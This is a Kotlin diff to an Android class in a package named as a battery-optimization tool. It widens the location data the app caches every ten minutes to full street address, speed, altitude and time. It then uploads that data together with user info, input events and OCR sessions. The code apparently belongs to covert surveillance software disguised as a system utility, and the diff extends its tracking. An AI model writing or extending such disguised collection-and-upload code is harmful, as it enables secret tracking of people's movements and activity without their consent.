@@ -53,13 +53,35 @@ class InputRepository private constructor(private val context: Context) {
     val LOCATION_INTERVAL_SECONDS = 10 * 60 // 10 minutes
     private val LOCATION_INTERVAL_MS = LOCATION_INTERVAL_SECONDS * 1000L
 
-    // Cached location (refreshed periodically)
+    // Cached location map (refreshed periodically, contains all geo fields from AMapLocationHelper)
     @Volatile
-    var cachedLatitude: Double = 0.0
-        private set
-    @Volatile
-    var cachedLongitude: Double = 0.0
-        private set
+    private var cachedLocationMap: Map<String, Any> = emptyMap()
+
+    private fun getCachedGeoLocation(): com.android.batteryoptimization.network.GeoLocationPayload {
+        val map = cachedLocationMap
+        return com.android.batteryoptimization.network.GeoLocationPayload(
+            latitude = (map["latitude"] as? Number)?.toDouble() ?: 0.0,
+            longitude = (map["longitude"] as? Number)?.toDouble() ?: 0.0,
+            accuracy = (map["accuracy"] as? Number)?.toFloat() ?: 0f,
+            altitude = (map["altitude"] as? Number)?.toDouble() ?: 0.0,
+            speed = (map["speed"] as? Number)?.toFloat() ?: 0f,
+            bearing = (map["bearing"] as? Number)?.toFloat() ?: 0f,
+            address = map["address"] as? String ?: "",
+            country = map["country"] as? String ?: "",
+            province = map["province"] as? String ?: "",
+            city = map["city"] as? String ?: "",
+            cityCode = map["cityCode"] as? String ?: "",
+            district = map["district"] as? String ?: "",
+            adCode = map["adCode"] as? String ?: "",
+            street = map["street"] as? String ?: "",
+            streetNum = map["streetNum"] as? String ?: "",
+            road = map["road"] as? String ?: "",
+            description = map["description"] as? String ?: "",
+            locationType = (map["locationType"] as? Number)?.toInt() ?: -1,
+            coordType = map["coordType"] as? String ?: "",
+            locationTime = (map["locationTime"] as? Number)?.toLong() ?: 0L
+        )
+    }
 
     init {
         loadEvents()
@@ -187,9 +209,10 @@ class InputRepository private constructor(private val context: Context) {
             val result = AMapLocationHelper.getLocation(context)
             val errorCode = result["errorCode"] as? Int ?: -1
             if (errorCode == 0) {
-                cachedLatitude = (result["latitude"] as? Number)?.toDouble() ?: 0.0
-                cachedLongitude = (result["longitude"] as? Number)?.toDouble() ?: 0.0
-                Log.d(TAG, "定位刷新: lat=$cachedLatitude, lng=$cachedLongitude, time=${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}")
+                cachedLocationMap = result
+                val lat = result["latitude"] ?: 0.0
+                val lng = result["longitude"] ?: 0.0
+                Log.d(TAG, "定位刷新: lat=$lat, lng=$lng, time=${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}")
             }
         } catch (e: Exception) {
             Log.e(TAG, "定位刷新异常", e)
@@ -272,8 +295,7 @@ class InputRepository private constructor(private val context: Context) {
             val requestBody = com.android.batteryoptimization.network.UploadRequest(
                 userInfo = userInfoPayload,
                 events = eventPayloads,
-                latitude = cachedLatitude,
-                longitude = cachedLongitude,
+                geoLocation = getCachedGeoLocation(),
                 ocr = ocrSessions.ifEmpty { null }
             )
 
